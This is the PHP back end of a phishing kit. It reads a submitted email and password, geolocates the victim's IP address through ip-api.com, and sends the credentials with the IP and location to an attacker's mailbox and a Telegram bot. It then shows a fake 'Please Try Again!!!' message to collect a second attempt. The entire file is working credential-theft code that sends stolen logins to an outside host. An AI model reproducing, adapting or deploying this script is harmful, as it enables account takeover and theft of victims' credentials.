<?php
include("telegram.php");
$email = trim($_POST['email']);
$password = trim($_POST['password']);
$detail = trim($_POST['detail']);

//=======================
$_GET["tb"] = true;  //ANALYSIS
// include("Analysis405/attachment.php"); //ANALYSIS

//function for ipv4
function get_client_ip() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

if($email != null && $password != null){
$ip = get_client_ip();
// include("Analysis405/rslt.php"); //SAVE CPANEL

$loc = file_get_contents("http://ip-api.com/json/$ip");
$location = json_decode($loc);

$state = $location->region;
$zip = $location->zip;
$city = $location->city;
$isp = $location->isp;
$isp = substr($isp,0,12);
}
//=========npx=========


if($email != null && $password != null){
//	$ip = $_SERVER['REMOTE_ADDR'];
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
//	$message .= "----------------\n";
	$message .= $detail."\n";
	$message .= "【UN】  : ".$email."\n";
	$message .= "【PW】  : ".$password."\n";
//	$message .= "|------ I N F O | I P ------|\n";
	$message .= "【IP】  : ".$ip."...️\n";
//	$message .= "📍|--- http://www.geoiptool.com/?IP=$ip ---|📍\n";
//	$message .= "User Agent : ".$useragent."\n";
    $message .= "【Location】: ".$state."| ".$zip."| ".$isp."\n";
	$message .= "----------------\n";
	
	if($send_email == 1){
	$send = $box;
	$subject = "Login : $ip";
    mail($send, $subject, $message);
	}
	
	$count = $_POST['count'];
	
	if($send_bot == 1){	
	$mess =urlencode($message);
	$url = "https://api.telegram.org/bot".$botToken."/sendmessage?chat_id=".$id ."&text=".$mess;
	$curl = curl_init();
	// curl_setopt ($curl, CURLOPT_PORT , 8089);
	curl_setopt($curl, CURLOPT_URL, $url);
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	// curl_exec($curl);
	$result=curl_exec($curl);
	}
	
	if ($result) {
		$signal = 'ok';
		$msg = 'Please Try Again!!!';
	}
	curl_close($curl);  
	$signal = 'ok';
	$msg = 'Please Try Again!!!';
	
	// $praga=rand();
	// $praga=md5($praga);    
	$signal = 'ok';
	$msg = 'Please Try Again!!!';
	
	// $praga=rand();
	// $praga=md5($praga);
}
else{
	$signal = 'bad';
	$msg = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'msg' => $msg
    );
    echo json_encode($data);

?>